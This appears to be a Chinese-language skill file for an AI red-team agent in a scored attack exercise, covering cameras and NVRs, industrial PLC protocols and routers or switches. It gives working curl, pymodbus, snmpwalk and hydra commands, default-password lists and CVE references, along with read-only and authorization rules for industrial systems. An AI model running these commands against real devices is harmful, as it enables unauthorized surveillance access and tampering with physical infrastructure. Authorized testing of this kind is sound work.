---
name: iot-iiot-netdev
description: 物联网/工控/网络设备得分面：摄像头与 NVR 默认口令与未授权、ONVIF 探测、Modbus/S7 工控端口、路由器交换机 SNMP 枚举与默认口令、iot-platform/iiot/netdev 三类得分的取法
whenToUse: 资产里出现 RTSP/ONVIF 端口（554/8000/10554）、工控端口（502/102/5000/4840/9600）、网络设备管理口（23/161/2601）、或靶标含园区/工厂/楼宇时
---

# 物联网 / 工控 / 网络设备（三个冷门但确定的得分点）

政企与园区靶场里，`iot-platform`（物联网平台）、`iiot`（工业互联网）、`netdev`（网络设备，普通 100/管理员 200）
三条得分点**竞争少、默认配置存活率高**——别人都在打业务系统时，这三发是白捡的分。

共性：**固件默认口令几乎不改、协议明文可枚举、监控与 WAF 完全不覆盖这些端口**。

## 识别：端口 → 类别速查

| 端口 | 是什么 | 归哪条得分点 |
| --- | --- | --- |
| 554 / 8554 / 10554 | RTSP 视频流 | `iot-platform`（摄像头/NVR） |
| 80/8000/8080（设备页） | 摄像机 Web（Hikvision/Dahua/Axis/TP-Link） | `iot-platform` |
| 37777/37778 | 海康私有协议 | `iot-platform` |
| 502 / 102 / 2404 / 4840 / 9600 / 47808 | Modbus-TCP / S7comm / OPC-UA / BACnet / MS/TP | `iiot` |
| 161/16100 (SNMP) / 23 (Telnet) / 22 | 路由器/交换机/无线控制器管理 | `netdev` |
| 2601/2602 | 3Com/HP 管理 | `netdev` |
| 80/443 + "Confluence/Jenkins 不像"的极简页 | 打印机（HP/Canon）、门禁、UPS、PDU | `iot-platform`/`netdev` |

**gogo/fscan 都会标这些**（`frameworks` 里有 rtsp/modbus/snmp 键）——先查库再动手，别重扫。

## 一、摄像头 / NVR（`iot-platform`）

```bash
# 1) 未授权判定（零成本，先做）
curl -s "http://TARGET/ISAPI/System/deviceInfo" -u admin: -m 5          # 海康空口令
curl -s "http://TARGET/cgi-bin/snapshot.cgi" -o runs/frame.jpg -m 5     # 未授权直接出图
curl -s "http://TARGET/LiveMedia/chM/MJPEG.3gp" -m 5 -o runs/live.mjpg  # 大华
# 2) ONVIF 枚举（无需凭据的机器一大把）
curl -s -X POST "http://TARGET:2020/onvif/device_service" -H 'Content-Type: application/soap+xml' \
  -d '<s:Envelope xmlns:s="http://www.w3.org/2003/11/soap-envelope"><s:Body><GetDeviceInformation xmlns="http://www.onvif.org/ver10/device/wsdl"/></s:Body></s:Envelope>'
# 3) RTSP 流验证（拿到凭据后）
ffprobe -rtsp_transport tcp "rtsp://user:pass@TARGET:554/Streaming/Channels/101" 2>&1 | grep -i "Stream #"
# 4) 默认口令族（小字典，逐台试）：admin/admin、admin/12345、admin/admin123、
#    admin/(空)、888888/888888（海康老款）、admin/hik12345、root/pass（Dahua）
# 5) 已知 CVE 走 redteam_poc_search（海康 CVE-2017-7924 未授权全功能、大华信息泄露 CVE-2021-33044/33045）
```

**NVR（网络视频录像机）比单台摄像头值钱**：一台 NVR 管 16-64 路，拿到 NVR 管理权 = 整个监控平台得分 + 它往往接在内网核心段。

## 二、工控（`iiot`）

```bash
# Modbus-TCP(502)：读寄存器 = 未授权判定（零写入，安全）
#   用现成工具：modbus-rs / pymodbus（本机有 python 就一行）
python3 -c "from pymodbus.client import ModbusTcpClient as M; c=M('TARGET',502); c.connect(); print(c.read_holding_registers(0,10).registers)"
# S7comm(102)：读型号与版本（零写入）
python3 -c "from python_s7 import ..." 2>/dev/null || redteam_poc_search s7
#   有 snap7 时：GetModuleInformation 直接吐 CPU 型号（S7-300/400/1500/1200）
# OPC-UA(4840)：未授权 endpoint 枚举
#   opcua-client 或 curl 发 GET opcua://TARGET:4840 —— 多数匿名可读全部节点
# BACnet(47808/UDP)：bacscan / Yabe 枚举设备对象
```

**工控纪律（与业务系统完全不同）**：
- **只读优先**：读寄存器/读型号不改变物理状态；**写线圈/写寄存器会真的动阀门和电机**——写操作必须先报指挥拿授权；
- 工控设备**不能扫太狠**：老 PLC 扫描会宕机（S7-200 尤其脆），单连接、超时设 3 秒、别并发；
- 判定得分口径看 `redteam_score_list` 里 `iiot` 的实际 src 与 cap（读通关键寄存器/拿到工程文件即算）。

## 三、网络设备（`netdev`）

```bash
# 1) SNMP 枚举（默认 community 存活率惊人，先打这发）
snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.1        # 系统信息（型号/固件/uptime）
snmpwalk -v2c -c private TARGET 1.3.6.1.2.1.1       # 换个 community 再试
snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.4.1.0    # 路由表 → 新网段（内网地图！）
snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.2.2      # 接口表（含内网地址与掩码）
#   onesixtyone 批量扫 community：onesixtyone -c dict.txt -i runs/netdev.txt -o runs/snmp.txt
# 2) Telnet/SSH 默认口令（Cisco/H3C/华为常见组合）
hydra -L cisco_users.txt -P cisco_passes.txt TARGET telnet -t 2 -u 5
#   Cisco: enable 密码空 / cisco/cisco；H3C: admin/h3c, admin/admin；华为: admin/admin, admin/Admin@123
# 3) 已知未授权/信息泄露走 redteam_poc_search（H3C/华为/华三 Comware 系列多）
```

**SNMP 读到的路由表与接口表是内网测绘的免费地图**——把里面的 `10.x/172.x/192.168.x` 全部回报指挥并入资产库（`redteam_asset_add`），常常直接开出下一个网段。

## 四、记分口径（这三类怎么算分）

- `iot-platform`（物联网管控平台）：**平台级**管理权才算（NVR/门禁/楼控平台后台），单台摄像头登录按 `terminal-access` 或记入资产发现，别虚报成平台分；
- `iiot`（工业互联网）：读通关键 PLC/SCADA 数据或拿到工程文件；写操作需授权；
- `netdev`（网络设备）：普通档 100（只读/SNMP 信息）、管理员档 200（进配置模式/改配置能力）——**evidence 要写清拿到了哪一档**（`show running-config` 回显 = 管理员铁证）；
- 三类都**按台/设备数累加**的口径看 `redteam_score_list` 实际返回，别凭记忆。

## 失败分支

- **RTSP/ONVIF 无响应**：多半走私有协议（海康 8000/37777），改打 Web 口 + ISAPI；仍不行就查有没有 GB/T 28181 平台（`redteam_poc_search 28181`）。
- **SNMP 无 community**：换 onesixtyone 全字典（public/private/0/1/cisco/网络名）；还没有就退回 Telnet/SSH 默认口令 + HTTP 管理口（`/login.html`、`/UI/index`、`/cgi-bin/login`）。
- **PLC 扫不动/超时**：老设备单连接脆弱——串行、超时 5s、只读 102/502；仍不通就记"存在但不可达"，交给内网阶段从同段主机侧再试（可能只允许特定源）。
- **摄像头拿到画面但没管理权**：snapshot 未授权只算信息泄露（记 `candidate`），要 `iot-platform` 分必须进后台（增删用户/改配置）。

## 结果落库（必须做）

- 每台设备 `redteam_asset_add`：端口 `service` 写协议名（rtsp/onvif/modbus/s7/snmp），`banner` 写型号与固件（**型号是记分与 Nday 的依据**）。
- SNMP 读到的路由/接口内网地址：回报指挥 + 逐条入库，`provenance=passive`、`tool=snmpwalk`。
- 得分：`redteam_score_hit`（`iot-platform`/`iiot`/`netdev`），evidence 写实测回显（如「192.168.1.1｜H3C AR2220｜show version 回显｜管理员」）。
- 关键命令进 `redteam_chain_add`（`stage_code` 按所在侧 internet/internal），命令里保留协议与端口。

## 纪律

- **工控写操作、设备改配置一律先报指挥**——这两个面一旦动错，影响的是物理世界和全网连通性，不是重启一台服务器。
- 扫描限频：园区设备并发一高就假死（比业务系统脆得多），`-t 2`、串行、超时放宽到 5s。
- 摄像头画面是敏感数据：**不要把真实画面外传到公共捕获服务**，留证存本机 `runs/` 并脱敏登记。



<!-- runnability:start scripts/inject-runnability.mjs 生成，勿手改 -->

## 本机可执行性（自动探测；命令是按 Linux/Kali 写的，照抄会撞空）

本技能命令用到的工具里，本机（PATH 与 toolkit 双探）没有：`hydra`
- `hydra`：Windows 无官方构建；改用 `netexec`（nxc）打 SMB/WinRM/MSSQL，HTTP 表单用 `curl` 循环

runnability:end -->

<!-- skill-link-graph:build-skill-graph.mjs 生成，勿手改 -->

## 链路位置（本技能不是孤岛：上游先做、下游交给谁、结果落哪个库）

- **阶段**：4 漏洞利用｜**角色**：`exploit`
- **上游**（先做完这些再进来）：`ot-ics`
- **下游**（产出交给谁）：`firmware-pentest`
- **互补**（同类场景一起用）：`firmware-pentest`
- **落库**（做完必须记进演练台，没落库的发现等于没发生）：`vuln` —— 用对应的 `redteam_*` 工具写入，带上原始请求/证据
- **收口必做**（打完不算完，要能证明）：命中判定走 `verification-discipline`（误报排除 + 修复五档判定）；打完之后要**补丁后复测**（补丁/修复后再打一遍，确认真的关掉了，而不是换个入口还能打）也走它；说清对手能不能发现走 `detection-pairing`（检测规则 + 响度）；战果归到哪个战术走 `attack-traceability`（ATT&CK 映射）。**出交付物用 `redteam_report`**（kind=score 出计分战报、kind=targets 出靶标清单），整条链路串起来看用 `redteam_attack_chain` / `redteam_attack_path` —— 这两个只在 `redteam-setup` 的工具表里登记过，做具体攻击时不会想到去翻，所以在这里点名

- **配套工具**（做完这步要落库/查询时用，别只记在上下文里）：`redteam_vuln_query`（按 severity/status/cve/cidr 组合筛，别在长列表里翻）

<!-- /skill-link-graph -->

## ATT&CK 映射

> 本技能会执行的手法对应 MITRE ATT&CK v20.1 下列技术（编号来自 `lib/redteam/attack-map.js`，唯一来源）。

| 战术 | 编号 | 技术 |
| --- | --- | --- |
| 侦察 | T1595 | 主动扫描 |
| 初始访问 | T1190 | 利用面向公众的应用 |
| 初始访问 | T1669 | Wi-Fi Networks（连入无线网络） |

落到事实库时，把这几个编号写进 `attack_step` 的标题或 `detail`：报告与检测配对要靠它们对齐；
**没写编号的动作在「按 ATT&CK 复核」时等于不存在**（防守方按技术编号查日志，查不到就是漏）。
